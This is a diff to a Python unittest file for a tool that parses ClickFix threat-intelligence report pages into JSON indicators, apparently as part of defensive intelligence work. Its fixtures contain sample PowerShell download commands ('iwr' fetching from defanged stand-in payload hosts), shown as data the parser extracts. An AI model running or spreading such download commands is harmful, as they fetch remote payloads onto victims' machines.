@@ -8,7 +8,7 @@ from unittest.mock import patch
 import export_clickfix as exporter
 
 
-def report(lure="lure[.]example", delivery=(), payload=()):
+def report(lure="lure[.]example", delivery=(), payload=(), related=(), extracted=""):
     def column(label, values):
         nodes = "".join(
             f'<div class="obs-infra-node"><p class="obs-data">{value}</p></div>'
@@ -19,12 +19,19 @@ def report(lure="lure[.]example", delivery=(), payload=()):
             f'<p class="obs-label">{label}</p>{nodes}</div>'
         )
 
+    related_nodes = "".join(
+        f'<li class="obs-infra-related"><span class="obs-data">{value}</span>'
+        f'<span class="obs-badge">{tag}</span></li>'
+        for value, tag in related
+    )
     return (
+        extracted
+        +
         '<details id="infrastructure"><div class="obs-infra">'
         + column("Lure", [lure])
         + column("Delivery", delivery)
         + column("Payload", payload)
-        + '</div><div class="obs-data">unrelated.example</div></details>'
+        + f'</div><ul>{related_nodes}</ul><div class="obs-data">unrelated.example</div></details>'
     )
 
 
@@ -49,8 +56,61 @@ class InfrastructureTests(unittest.TestCase):
                 "UrlDomain": "lure.example",
                 "DeliveryUrl": ["delivery.example"],
                 "PayloadUrl": ["https://payload.example/a?x=1&y=2"],
+                "IP": ["192.0.2.4", "2001:db8::1"],
+                "Related": [],
+                "Payload": None,
+                "ResolvedDownloadUrl": [],
             },
         )
+
+    def test_extracts_payload_command_resolved_urls_and_related(self):
+        extracted = (
+            '<section class="obs-alert obs-alert-danger">'
+            '<h2>Extracted payload</h2>'
+            '<pre class="obs-data">$f=$([guid]::NewGuid()); '
+            'iwr "https://payload[.]example/x?a=1&amp;b=2"</pre>'
+            '<div><p class="obs-label">Resolved download <!-- -->URL</p>'
+            '<ul><li>https://payload[.]example/x?a=1&amp;b=2</li>'
+            '<li>https://other[.]example/file</li></ul></div></section>'
+        )
+        html = report(
+            delivery=["delivery[.]example", "192[.]0[.]2[.]4"],
+            payload=["https://payload[.]example/x"],
+            related=[("related[.]example", "Reference"),
+                     ("192[.]0[.]2[.]4", "resolved-host")],
+            extracted=extracted,
+        )
+        result = exporter.parse_infrastructure(html)
+        self.assertEqual(result["IP"], ["192.0.2.4"])
+        self.assertEqual(result["PayloadUrl"], ["https://payload.example/x"])
+        self.assertEqual(result["Related"], [
+            {"Value": "related.example", "Type": "Reference"},
+            {"IP": "192.0.2.4", "Type": "resolved-host"},
+        ])
+        self.assertEqual(
+            result["Payload"],
+            '$f=$([guid]::NewGuid()); iwr "https://payload[.]example/x?a=1&b=2"',
+        )
+        self.assertEqual(result["ResolvedDownloadUrl"], [
+            "https://payload.example/x?a=1&b=2", "https://other.example/file",
+        ])
+
+    def test_lure_and_payload_ip_are_collected_separately(self):
+        result = exporter.parse_infrastructure(
+            report(lure="192[.]0[.]2[.]1", payload=["2001:db8::1"])
+        )
+        self.assertIsNone(result["UrlDomain"])
+        self.assertEqual(result["PayloadUrl"], [])
+        self.assertEqual(result["IP"], ["192.0.2.1", "2001:db8::1"])
+
+    def test_incomplete_payload_or_related_fails(self):
+        cases = [
+            report(extracted='<section class="obs-alert-danger"><h2>Extracted payload</h2></section>'),
+            report().replace('</details>', '<li class="obs-infra-related">bad</li></details>'),
+        ]
+        for html in cases:
+            with self.subTest(html=html), self.assertRaises(ValueError):
+                exporter.parse_infrastructure(html)
 
     def test_empty_columns_are_arrays(self):
         self.assertEqual(exporter.parse_infrastructure(report())["PayloadUrl"], [])
@@ -86,7 +146,17 @@ class ExportTests(unittest.TestCase):
             ("yesterday", "2026-11-12T10:00:00Z"),
             ("partial", "2026-11-10T10:00:00Z"),
         ]
-        page = report(delivery=["delivery[.]example"]).encode()
+        page = report(
+            delivery=["delivery[.]example", "192[.]0[.]2[.]4"],
+            payload=["https://payload[.]example/x"],
+            related=[("related[.]example", "Reference")],
+            extracted=(
+                '<section class="obs-alert-danger"><h2>Extracted payload</h2>'
+                '<pre>iwr https://payload[.]example/x</pre>'
+                '<div><p class="obs-label">Resolved download URL</p>'
+                '<ul><li>https://payload[.]example/x</li></ul></div></section>'
+            ),
+        ).encode()
 
         def fake_fetch(url):
             return sitemap(entries) if url == exporter.SITEMAP_URL else page
@@ -103,6 +173,11 @@ class ExportTests(unittest.TestCase):
             self.assertEqual(json.loads((output / "20261111.json").read_text()), [])
             result = json.loads((output / "20261113.json").read_text())
             self.assertEqual(result[0]["DeliveryUrl"], ["delivery.example"])
+            self.assertEqual(result[0]["IP"], ["192.0.2.4"])
+            self.assertEqual(result[0]["PayloadUrl"], ["https://payload.example/x"])
+            self.assertEqual(result[0]["Payload"], "iwr https://payload[.]example/x")
+            self.assertEqual(result[0]["ResolvedDownloadUrl"], ["https://payload.example/x"])
+            self.assertEqual(result[0]["Related"], [{"Value": "related.example", "Type": "Reference"}])
 
     def test_partial_day_created_when_missing(self):
         entries = [("partial", "2026-11-10T10:00:00Z")]
